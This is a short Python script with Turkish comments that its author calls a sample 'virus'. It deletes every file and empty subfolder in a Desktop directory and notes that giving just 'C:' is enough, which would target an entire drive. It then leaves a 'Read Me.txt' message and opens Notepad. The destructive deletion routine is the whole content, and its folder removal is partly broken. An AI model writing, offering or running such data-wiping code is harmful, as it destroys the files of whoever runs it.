#belirtilen klasördeki tüm dosyaları siler. Virüs adını daha güzel gerçekleştirebilirdim ama örnek olarak bu kalabilir.
import os
import time
dizin=os.chdir("C:/Users/İRŞADİ/Desktop/yem")   #"C:" yazmanız yetrli.
list=os.listdir()
for i in list:
    if os.path.isdir(i)==True:
        os.rmdir(i)
        continue
    os.remove(i)
os.chdir("C:/Users/İRŞADİ/Desktop")     #yazmasanızda olur. Sadece masaüstüne gitmek için
with open("Read Me.txt","w") as file:
    file.write("-------Your Messages-------")
for i in range(1):
    notepad=os.system('notepad.exe')
    time.sleep(0.1)